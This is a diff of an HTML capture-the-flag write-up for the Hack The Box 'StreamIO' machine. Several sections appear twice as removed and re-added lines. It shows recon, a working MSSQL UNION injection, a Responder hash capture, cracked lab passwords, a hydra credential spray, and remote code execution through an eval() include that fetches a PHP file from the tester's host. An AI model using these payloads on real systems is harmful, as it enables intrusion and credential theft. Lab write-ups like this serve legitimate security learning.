+            <img src="/images/writeups/htb-streamio/htb-streamio-pwned.png" alt="HTB: StreamIO" style="width:100%;border-radius:0.5rem;margin:1.5rem 0;" />
+            
+            <div class="toc-container">
+    <button class="toc-toggle" type="button" onclick="toggleToc()">Table of Contents</button>
+    <div class="toc-content" id="tocContent">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#sql-injection-on-watchstreamiohtb">SQL Injection on watch.streamIO.htb</a></li>
+    <li><a href="#admin-panel-rfi-and-eval-rce">Admin Panel: RFI and eval() RCE</a></li>
+    <li><a href="#lateral-movement-to-nikk37">Lateral Movement to nikk37</a></li>
+    <li><a href="#firefox-credentials-and-the-laps-chain">Firefox Credentials and the LAPS Chain</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+<div class="mini-toc" id="miniToc">
+    <div class="mini-toc-header">
+        <div class="mini-toc-title">Contents</div>
+        <button class="mini-toc-minimize" type="button" onclick="toggleMiniToc()" aria-label="Minimize TOC">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1 8a.5.5 0 0 1 .5-.5h13a.5.5 0 0 1 0 1h-13A.5.5 0 0 1 1 8zM7.646 4.146a.5.5 0 0 1 .708 0l2 2a.5.5 0 0 1-.708.708L8.5 5.707V11.5a.5.5 0 0 1-1 0V5.707L6.354 6.854a.5.5 0 1 1-.708-.708l2-2z"/>
+            </svg>
+        </button>
+    </div>
+    <div class="mini-toc-content" id="miniTocContent"></div>
+</div>
+            <div class="page-content">
+                <p>Windows AD box with a PHP streaming site on HTTPS. The attack chain is unusually web-heavy for an HTB Active Directory box: you spend more time in Burp than in evil-winrm before the domain even becomes relevant. The interesting part isn&rsquo;t any single vulnerability. It&rsquo;s how a SQL injection on one subdomain eventually feeds into an eval() backdoor on another, and how Firefox&rsquo;s credential store hands over an AD account with a path nobody mentions until you look at it in BloodHound.</p>
+<h2 id="recon">Recon</h2>
+<p>10.129.11.215, domain <code>streamIO.htb</code>, DC hostname <code>DC</code>. Port 80 had the default IIS page. Port 443 was more interesting: the TLS certificate&rsquo;s Subject Alternative Names listed two hosts, <code>streamIO.htb</code> and <code>watch.streamIO.htb</code>. Standard AD ports alongside: Kerberos, LDAP, SMB, WinRM on 5985.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/htb/streamIO ❯ nmap -sC -sV -T4 <span class="nv">$DC_IP</span>
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-06-02 23:24 +0100
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.11.215
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.10s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">986</span> filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE       VERSION
+</span></span><span class="line"><span class="cl">53/tcp   open  domain        Simple DNS Plus
+</span></span><span class="line"><span class="cl">80/tcp   open  http          Microsoft IIS httpd 10.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Potentially risky methods: TRACE
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: IIS Windows Server
+</span></span><span class="line"><span class="cl">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: 2026-06-03 05:24:29Z<span class="o">)</span>
+</span></span><span class="line"><span class="cl">135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: streamIO.htb, Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">443/tcp  open  ssl/https?
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   h2
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>streamIO/countryName<span class="o">=</span>EU
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2022-02-22T07:03:28
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-03-24T07:03:28
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds?
+</span></span><span class="line"><span class="cl">464/tcp  open  kpasswd5?
+</span></span><span class="line"><span class="cl">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class="line"><span class="cl">636/tcp  open  tcpwrapped
+</span></span><span class="line"><span class="cl">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: streamIO.htb, Site: Default-First-Site-Name<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3269/tcp open  tcpwrapped
+</span></span><span class="line"><span class="cl">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
+</span></span><span class="line"><span class="cl">Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span></code></pre></div><p>The main site at <code>streamIO.htb</code> was a movie streaming platform. The footer had a staff section with names and job titles: Barry (Content manager), Oliver (Web Developer), Samantha (Public affairs manager).</p>
+<p><img src="/images/writeups/htb-streamio/web-streamio-staff-section.png" alt="streamio.htb footer showing staff members Barry, Oliver, and Samantha with their roles"></p>
+<p>I generated username variants and tried AS-REP roasting against all of them. Every account came back <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>. These names don&rsquo;t exist as AD accounts:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/htb/streamIO ✗ GetNPUsers.py streamIO.htb/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip 10.129.11.215
+</span></span><span class="line"><span class="cl">Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="o">(</span>Client not found in Kerberos database<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="o">(</span>Client not found in Kerberos database<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="o">(</span>Client not found in Kerberos database<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> User administrator doesn<span class="err">&#39;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
+</span></span></code></pre></div><p>The website names were a dead end. I moved on to the <code>watch.</code> subdomain.</p>
+<h2 id="sql-injection-on-watchstreamiohtb">SQL Injection on watch.streamIO.htb</h2>
+<p>The watch subdomain was a separate streaming interface. Fuzzing it found only a <code>/static</code> redirect:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/htb/streamIO ❯ ffuf -u https://watch.streamIO.htb/FUZZ -w ~/tools/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">static                  <span class="o">[</span>Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 291ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">Static                  <span class="o">[</span>Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 177ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">STATIC                  <span class="o">[</span>Status: 301, Size: 157, Words: 9, Lines: 2, Duration: 160ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">:: Progress: <span class="o">[</span>29999/29999<span class="o">]</span> :: Job <span class="o">[</span>1/1<span class="o">]</span> :: <span class="m">262</span> req/sec :: Duration: <span class="o">[</span>0:02:57<span class="o">]</span> :: Errors: <span class="m">1</span> ::
+</span></span></code></pre></div><p>There was an email form on the main watch page. SQLMap against that <code>email</code> parameter came back clean:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/htb/streamIO ❯ sqlmap -r req 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>03:21:48<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> parsing HTTP request from <span class="s1">&#39;req&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>03:21:48<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing connection to the target URL
+</span></span><span class="line"><span class="cl"><span class="o">[</span>03:21:49<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> the web server responded with an HTTP error code <span class="o">(</span>405<span class="o">)</span> which could interfere with the results of the tests
+</span></span><span class="line"><span class="cl"><span class="o">[</span>03:21:49<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> checking <span class="k">if</span> the target is protected by some kind of WAF/IPS
+</span></span><span class="line"><span class="cl"><span class="o">[</span>03:21:49<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="k">if</span> the target URL content is stable
+</span></span><span class="line"><span class="cl"><span class="o">[</span>03:21:49<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> target URL content is stable
+</span></span><span class="line"><span class="cl"><span class="o">[</span>03:21:49<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="k">if</span> POST parameter <span class="s1">&#39;email&#39;</span> is dynamic
+</span></span><span class="line"><span class="cl"><span class="o">[</span>03:21:49<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> POST parameter <span class="s1">&#39;email&#39;</span> does not appear to be dynamic
+</span></span><span class="line"><span class="cl"><span class="o">[</span>03:21:50<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> heuristic <span class="o">(</span>basic<span class="o">)</span> <span class="nb">test</span> shows that POST parameter <span class="s1">&#39;email&#39;</span> might not be injectable
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>03:22:04<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> POST parameter <span class="s1">&#39;email&#39;</span> does not seem to be injectable
+</span></span><span class="line"><span class="cl"><span class="o">[</span>03:22:04<span class="o">]</span> <span class="o">[</span>CRITICAL<span class="o">]</span> all tested parameters <span class="k">do</span> not appear to be injectable.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ending @ 03:22:04 /2026-06-03/
+</span></span></code></pre></div><p>Fuzzing found a <code>/search.php</code> endpoint. SQLMap triggered the site&rsquo;s blocking mechanism almost immediately. Each automated request redirected to <code>blocked.php</code> with an access denied page:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/htb/streamIO ✗ sqlmap -r search_req 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>03:36:01<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> parsing HTTP request from <span class="s1">&#39;search_req&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>03:36:01<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing connection to the target URL
+</span></span><span class="line"><span class="cl"><span class="o">[</span>03:36:02<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="k">if</span> the target URL content is stable
+</span></span><span class="line"><span class="cl"><span class="o">[</span>03:36:02<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="k">if</span> POST parameter <span class="s1">&#39;q&#39;</span> is dynamic
+</span></span><span class="line"><span class="cl"><span class="o">[</span>03:36:03<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> POST parameter <span class="s1">&#39;q&#39;</span> does not appear to be dynamic
+</span></span><span class="line"><span class="cl"><span class="o">[</span>03:36:04<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> heuristic <span class="o">(</span>basic<span class="o">)</span> <span class="nb">test</span> shows that POST parameter <span class="s1">&#39;q&#39;</span> might not be injectable
+</span></span><span class="line"><span class="cl"><span class="o">[</span>03:36:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="k">for</span> SQL injection on POST parameter <span class="s1">&#39;q&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>03:36:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;AND boolean-based blind - WHERE or HAVING clause&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">got a <span class="m">302</span> redirect to <span class="s1">&#39;https://watch.streamio.htb/blocked.php&#39;</span>. Do you want to follow? <span class="o">[</span>Y/n<span class="o">]</span> n
+</span></span></code></pre></div><p>Manual injection worked fine though. Injecting a single quote into the <code>q</code> parameter produced a Microsoft SQL Server error, confirming the database and the injectable parameter.</p>
+<p><img src="/images/writeups/htb-streamio/web-search-sqli-mssql-error.png" alt="Burp Suite showing POST to search.php with SQLi payload and MSSQL error response in the orange-highlighted box"></p>
+<p>In a union-based injection, you append a <code>UNION SELECT</code> to the original query so the database returns rows from a table you choose. The number of columns in your injected SELECT has to match the original query&rsquo;s column count, six columns here, determined by incrementing until the injection stopped erroring.</p>
+<p>I also tried coercing the SQL service&rsquo;s NTLMv2 hash via <code>xp_dirtree</code> pointing at a Responder listener. That worked, but the hash belonged to the <code>DC$</code> machine account, not a user account:</p>
+<pre tabindex="0"><code>[SMB] NTLMv2-SSP Client   : ::ffff:10.10.11.158
 [SMB] NTLMv2-SSP Username : streamIO\DC$
 [SMB] NTLMv2-SSP Hash     : DC$::streamIO:63c8495b2f15ac52:BC9ECFC7DE5F81A1C8CB9BD865873B43:010100000000000000901E25E5C6D8018E57573EFE652D490000000002000800420055004E00560001001E00570049004E002D004300540054004100430035004D004C00510039004B0004003400570049004E002D004300540054004100430035004D004C00510039004B002E00420055004E0056002E004C004F00430041004C0003001400420055004E0056002E004C004F00430041004C0005001400420055004E0056002E004C004F00430041004C000700080000901E25E5C6D801...
-</code></pre><p>Machine account hashes essentially never crack from a wordlist. Dead end.</p><p>Enumerating the <code>streamio</code> database found two tables: <code>movies</code> and <code>users</code>. Dumped the whole users table in one shot:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>q</span><span class=o>=</span><span class=n>kanyo</span><span class=s1>&#39; UNION SELECT 1,CONCAT(username,&#39;</span><span class=p>:</span><span class=s1>&#39;,password),3,4,5,6 FROM users--
-</span></span></span></code></pre></div><p><img src=/images/writeups/htb-streamio/web-sqli-user-hash-dump.png alt="Burp Suite response showing admin:665a50ac… and Alexandra user:hash pairs from the users table"></p><p>Threw all the hashes at hashcat with rockyou. Twelve cracked:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/htb/streamIO ✗ hashcat -m <span class=m>0</span> hashes.txt /usr/share/wordlists/rockyou.txt --user --show
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd
-</span></span><span class=line><span class=cl>Barry:54c88b2dbd7b1a84012fabc1a4c73415:<span class=nv>$hadoW</span>
-</span></span><span class=line><span class=cl>Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:<span class=nv>$monique$1991</span>$
-</span></span><span class=line><span class=cl>Clara:ef8f3d30a856cf166fb8215aca93e9ff:%<span class=nv>$clara</span>
-</span></span><span class=line><span class=cl>Juliette:6dcd87740abb64edfa36d170f0d5450d:<span class=nv>$3</span>xybitch
-</span></span><span class=line><span class=cl>Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
-</span></span><span class=line><span class=cl>Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
-</span></span><span class=line><span class=cl>Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
-</span></span><span class=line><span class=cl>Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
-</span></span><span class=line><span class=cl>Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical
-</span></span><span class=line><span class=cl>Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
-</span></span><span class=line><span class=cl>yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
-</span></span></code></pre></div><p>Barry and yoshihide were the candidates who might have AD accounts. Barry failed both WinRM and SMB:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/htb/streamIO ❯ nxc winrm 10.129.11.215 -u barry -p <span class=s1>&#39;$hadoW&#39;</span>
-</span></span><span class=line><span class=cl>WINRM       10.129.11.215   <span class=m>5985</span>   DC               <span class=o>[</span>*<span class=o>]</span> Windows <span class=m>10</span> / Server <span class=m>2019</span> Build <span class=m>17763</span> <span class=o>(</span>name:DC<span class=o>)</span> <span class=o>(</span>domain:streamIO.htb<span class=o>)</span> 
-</span></span><span class=line><span class=cl>WINRM       10.129.11.215   <span class=m>5985</span>   DC               <span class=o>[</span>-<span class=o>]</span> streamIO.htb<span class=se>\b</span>arry:<span class=nv>$hadoW</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>…/htb/streamIO ✗ nxc smb 10.129.11.215 -u barry -p <span class=s1>&#39;$hadoW&#39;</span>
-</span></span><span class=line><span class=cl>SMB         10.129.11.215   <span class=m>445</span>    DC               <span class=o>[</span>*<span class=o>]</span> Windows <span class=m>10</span> / Server <span class=m>2019</span> Build <span class=m>17763</span> x64 <span class=o>(</span>name:DC<span class=o>)</span> <span class=o>(</span>domain:streamIO.htb<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:None<span class=o>)</span>
-</span></span><span class=line><span class=cl>SMB         10.129.11.215   <span class=m>445</span>    DC               <span class=o>[</span>-<span class=o>]</span> streamIO.htb<span class=se>\b</span>arry:<span class=nv>$hadoW</span> STATUS_LOGON_FAILURE
-</span></span></code></pre></div><p>There was a login page at <code>streamIO.htb/login.php</code>. Neither admin nor barry credentials worked there either. Gobuster on the main domain found an <code>/admin</code> directory with a <code>master.php</code> inside it that returned a bare <code>Only accessible through includes</code> message when accessed directly:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/htb/streamIO ❯ gobuster dir -u https://streamIO.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -k -t <span class=m>50</span> -x php
-</span></span><span class=line><span class=cl>ADMIN                <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 150<span class=o>]</span> <span class=o>[</span>--&gt; https://streamIO.htb/ADMIN/<span class=o>]</span>
-</span></span><span class=line><span class=cl>Admin                <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 150<span class=o>]</span> <span class=o>[</span>--&gt; https://streamIO.htb/Admin/<span class=o>]</span>
-</span></span><span class=line><span class=cl>About.php            <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 7825<span class=o>]</span>
-</span></span><span class=line><span class=cl>Contact.php          <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 6434<span class=o>]</span>
-</span></span><span class=line><span class=cl>Login.php            <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 4145<span class=o>]</span>
-</span></span><span class=line><span class=cl>about.php            <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 7825<span class=o>]</span>
-</span></span><span class=line><span class=cl>admin                <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 150<span class=o>]</span> <span class=o>[</span>--&gt; https://streamIO.htb/admin/<span class=o>]</span>
-</span></span><span class=line><span class=cl>contact.php          <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 6434<span class=o>]</span>
-</span></span><span class=line><span class=cl>index.php            <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 13497<span class=o>]</span>
-</span></span><span class=line><span class=cl>...
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>…/htb/streamIO ✗ gobuster dir -u https://streamIO.htb/admin -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -k -t <span class=m>50</span> -x php
-</span></span><span class=line><span class=cl>Index.php            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 18<span class=o>]</span>
-</span></span><span class=line><span class=cl>index.php            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 18<span class=o>]</span>
-</span></span><span class=line><span class=cl>master.php           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 58<span class=o>]</span>
-</span></span></code></pre></div><p>To get into the admin panel I needed valid credentials. Sprayed all cracked credentials against the login page with hydra:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/htb/streamIO ❯ hydra -C userpass streamio.htb https-post-form <span class=s2>&#34;/login.php:username=^USER^&amp;password=^PASS^:F=failed&#34;</span>
-</span></span><span class=line><span class=cl>Hydra v9.7 <span class=o>(</span>c<span class=o>)</span> <span class=m>2023</span> by van Hauser/THC <span class=p>&amp;</span> David Maciejak
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>DATA<span class=o>]</span> max <span class=m>12</span> tasks per <span class=m>1</span> server, overall <span class=m>12</span> tasks, <span class=m>12</span> login tries, ~1 try per task
-</span></span><span class=line><span class=cl><span class=o>[</span>DATA<span class=o>]</span> attacking http-post-forms://streamio.htb:443/login.php:username<span class=o>=</span>^USER^<span class=p>&amp;</span><span class=nv>password</span><span class=o>=</span>^PASS^:F<span class=o>=</span>failed
-</span></span><span class=line><span class=cl><span class=o>[</span>443<span class=o>][</span>http-post-form<span class=o>]</span> host: streamio.htb   login: yoshihide   password: 66boysandgirls..
-</span></span><span class=line><span class=cl><span class=m>1</span> of <span class=m>1</span> target successfully completed, <span class=m>1</span> valid password found
-</span></span><span class=line><span class=cl>Hydra <span class=o>(</span>https://github.com/vanhauser-thc/thc-hydra<span class=o>)</span> finished at 2026-06-03 05:14:06
-</span></span></code></pre></div><p><code>yoshihide:66boysandgirls..</code> logged in.</p><h2 id=admin-panel-rfi-and-eval-rce>Admin Panel: RFI and eval() RCE</h2><p><img src=/images/writeups/htb-streamio/web-admin-panel-logged-in.png alt="streamio.htb admin panel showing User management, Staff management, Movie management, and Leave a message for admin options"></p><p>Each button in the admin panel appended a query parameter: <code>?user=</code>, <code>?staff=</code>, <code>?movie=</code>. Fuzzing for additional parameters with a valid session cookie found a <code>debug</code> parameter. Testing <code>?debug=master.php</code> loaded the Movie management page, so <code>debug</code> was feeding a filename into <code>include()</code> server-side.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/htb/streamIO ❯ ffuf -u <span class=s2>&#34;https://streamio.htb/admin/index.php?FUZZ=master.php&#34;</span> -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -H <span class=s2>&#34;Cookie: PHPSESSID=fflo9cp8c2nkda0rq73klq9cfs&#34;</span> -fw <span class=m>85</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>debug                   <span class=o>[</span>Status: 200, Size: 343060, Words: 17814, Lines: 11171, Duration: 94ms<span class=o>]</span>
-</span></span><span class=line><span class=cl>movie                   <span class=o>[</span>Status: 200, Size: 320235, Words: 15986, Lines: 10791, Duration: 115ms<span class=o>]</span>
-</span></span><span class=line><span class=cl>staff                   <span class=o>[</span>Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 93ms<span class=o>]</span>
-</span></span><span class=line><span class=cl>user                    <span class=o>[</span>Status: 200, Size: 2444, Words: 206, Lines: 75, Duration: 69ms<span class=o>]</span>
-</span></span><span class=line><span class=cl>:: Progress: <span class=o>[</span>6453/6453<span class=o>]</span> :: Job <span class=o>[</span>1/1<span class=o>]</span> :: <span class=m>457</span> req/sec :: Duration: <span class=o>[</span>0:00:14<span class=o>]</span> :: Errors: <span class=m>0</span> ::
-</span></span></code></pre></div><p>The next question was whether it could load a remote URL instead of a local path. Remote File Inclusion works when PHP&rsquo;s <code>allow_url_include</code> is enabled. If <code>include()</code> accepts URLs, pointing it at a file on my machine would make the PHP server fetch my file and execute it.</p><p>Before testing blind, I used it to read the server&rsquo;s own source code first, pointing <code>include</code> at the local <code>master.php</code> path to leak it:</p><p><img src=/images/writeups/htb-streamio/web-rfi-master-php-source-code.png alt="Burp Suite POST request with include parameter pointing to master.php, response showing PHP source code with eval(file_get_contents($_POST[‘include’])) highlighted"></p><p>The relevant section at the bottom of master.php:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;include&#39;</span><span class=p>]))</span>
-</span></span><span class=line><span class=cl><span class=p>{</span>
-</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;include&#39;</span><span class=p>]</span> <span class=o>!==</span> <span class=s2>&#34;index.php&#34;</span> <span class=p>)</span> 
-</span></span><span class=line><span class=cl><span class=k>eval</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;include&#39;</span><span class=p>]));</span>
-</span></span><span class=line><span class=cl><span class=k>else</span>
-</span></span><span class=line><span class=cl><span class=k>echo</span><span class=p>(</span><span class=s2>&#34; ---- ERROR ---- &#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span></code></pre></div><p><code>eval(file_get_contents($_POST['include']))</code>. It fetches whatever URL or path you pass in the <code>include</code> POST parameter and evaluates it as PHP. This is full RCE: serve a PHP file with <code>system()</code> calls from a local HTTP server, and the box will fetch and execute it. The only restriction is that <code>index.php</code> is blocked by name check.</p><p>Source code also leaked the database credentials: <code>db_admin:B1@hx31234567890</code>.</p><p>The execution chain: POST to <code>/admin/?debug=master.php</code> with <code>include=http://10.10.16.129:9000/shell.php</code>. Tested with a directory listing first:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>…/htb/streamIO ✗ cat &gt; shell.php
-</span></span><span class=line><span class=cl>system<span class=o>(</span><span class=s2>&#34;dir C:\Users\&#34;);
-</span></span></span></code></pre></div><pre tabindex=0><code>POST /admin/?debug=master.php HTTP/2
+</code></pre><p>Machine account hashes essentially never crack from a wordlist. Dead end.</p>
+<p>Enumerating the <code>streamio</code> database found two tables: <code>movies</code> and <code>users</code>. Dumped the whole users table in one shot:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">q</span><span class="o">=</span><span class="n">kanyo</span><span class="s1">&#39; UNION SELECT 1,CONCAT(username,&#39;</span><span class="p">:</span><span class="s1">&#39;,password),3,4,5,6 FROM users--
+</span></span></span></code></pre></div><p><img src="/images/writeups/htb-streamio/web-sqli-user-hash-dump.png" alt="Burp Suite response showing admin:665a50ac… and Alexandra user:hash pairs from the users table"></p>
+<p>Threw all the hashes at hashcat with rockyou. Twelve cracked:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/htb/streamIO ✗ hashcat -m <span class="m">0</span> hashes.txt /usr/share/wordlists/rockyou.txt --user --show
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd
+</span></span><span class="line"><span class="cl">Barry:54c88b2dbd7b1a84012fabc1a4c73415:<span class="nv">$hadoW</span>
+</span></span><span class="line"><span class="cl">Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:<span class="nv">$monique$1991</span>$
+</span></span><span class="line"><span class="cl">Clara:ef8f3d30a856cf166fb8215aca93e9ff:%<span class="nv">$clara</span>
+</span></span><span class="line"><span class="cl">Juliette:6dcd87740abb64edfa36d170f0d5450d:<span class="nv">$3</span>xybitch
+</span></span><span class="line"><span class="cl">Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
+</span></span><span class="line"><span class="cl">Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
+</span></span><span class="line"><span class="cl">Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
